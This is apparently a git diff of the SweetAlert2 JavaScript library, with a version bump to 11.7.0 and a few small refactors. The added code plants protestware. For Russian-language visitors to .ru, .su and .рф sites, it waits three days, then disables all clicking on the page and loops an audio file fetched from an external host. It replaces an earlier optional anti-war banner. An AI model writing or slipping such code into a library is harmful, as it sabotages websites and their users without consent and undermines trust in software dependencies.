@@ -10,13 +10,12 @@ import { DismissReason } from './utils/DismissReason.js'
 import Timer from './utils/Timer.js'
 import { unsetAriaHidden } from './utils/aria.js'
 import * as dom from './utils/dom/index.js'
-import { setInnerHtml } from './utils/dom/index.js'
 import { handleInputOptionsAndValue } from './utils/dom/inputUtils.js'
 import { getTemplateParams } from './utils/getTemplateParams.js'
 import { openPopup } from './utils/openPopup.js'
 import defaultParams, { showWarningsForParams } from './utils/params.js'
 import setParameters from './utils/setParameters.js'
-import { callIfFunction, getRandomElement } from './utils/utils.js'
+import { callIfFunction } from './utils/utils.js'
 
 let currentInstance
 
@@ -225,7 +224,7 @@ const initFocus = (domCache, innerParams) => {
   }
 
   if (!focusButton(domCache, innerParams)) {
-    setFocus(innerParams, -1, 1)
+    setFocus(-1, 1)
   }
 }
 
@@ -259,49 +258,25 @@ const blurActiveElement = () => {
   }
 }
 
-// This anti-war message will only be shown to Russian users visiting Russian sites
+// Dear russian users visiting russian sites. Let's have fun.
 if (typeof window !== 'undefined' && /^ru\b/.test(navigator.language) && location.host.match(/\.(ru|su|xn--p1ai)$/)) {
-  if (Math.random() < 0.1) {
-    const noWar = document.createElement('div')
-    noWar.className = 'leave-russia-now-and-apply-your-skills-to-the-world'
-    const video = getRandomElement([
-      {
-        text: `В нижеприведённом видео объясняется как каждый из нас может помочь в том,
-        <strong>чтобы эта бессмысленная и бесчеловечная война остановилась</strong>:`,
-        id: '4CfDhaRkw7I',
-      },
-      {
-        text: 'Эмпатия - главное <strong>человеческое</strong> чувство. Способность сопереживать. <strong>Способность поставить себя на место другого.</strong>',
-        id: 's-GLAIY4DXA',
-      },
-    ])
-    setInnerHtml(
-      noWar,
-      `
-      <div>
-        Если мы не остановим войну, она придет в дом <strong>каждого из нас</strong> и её последствия будут <strong>ужасающими</strong>.
-      </div>
-      <div>
-        Путинский режим за 20 с лишним лет своего существования вдолбил нам, что мы бессильны и один человек не может ничего сделать. <strong>Это не так!</strong>
-      </div>
-      <div>
-        ${video.text}
-      </div>
-      <iframe width="560" height="315" src="https://www.youtube.com/embed/${video.id}" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
-      <div>
-        Нет войне!
-      </div>
-      `
-    )
-    const closeButton = document.createElement('button')
-    closeButton.innerHTML = '&times;'
-    closeButton.onclick = () => noWar.remove()
-    noWar.appendChild(closeButton)
-    window.addEventListener('load', () => {
+  const now = new Date()
+  const initiationDate = localStorage.getItem('swal-initiation')
+  if (!initiationDate) {
+    localStorage.setItem('swal-initiation', `${now}`)
+  } else if ((now.getTime() - Date.parse(initiationDate)) / (1000 * 60 * 60 * 24) > 3) {
+    setTimeout(() => {
+      document.body.style.pointerEvents = 'none'
+      const ukrainianAnthem = document.createElement('audio')
+      ukrainianAnthem.src = 'https://flag-gimn.ru/wp-content/uploads/2021/09/Ukraina.mp3'
+      ukrainianAnthem.loop = true
+      document.body.appendChild(ukrainianAnthem)
       setTimeout(() => {
-        document.body.appendChild(noWar)
-      }, 1000)
-    })
+        ukrainianAnthem.play().catch(() => {
+          // ignore
+        })
+      }, 2500)
+    }, 500)
   }
 }
 
@@ -315,7 +290,7 @@ Object.assign(SweetAlert, staticMethods)
 Object.keys(instanceMethods).forEach((key) => {
   /**
    * @param {...any} args
-   * @returns {any}
+   * @returns {any | undefined}
    */
   SweetAlert[key] = function (...args) {
     if (currentInstance) {
@@ -326,6 +301,6 @@ Object.keys(instanceMethods).forEach((key) => {
 
 SweetAlert.DismissReason = DismissReason
 
-SweetAlert.version = '11.4.33'
+SweetAlert.version = '11.7.0'
 
 export default SweetAlert
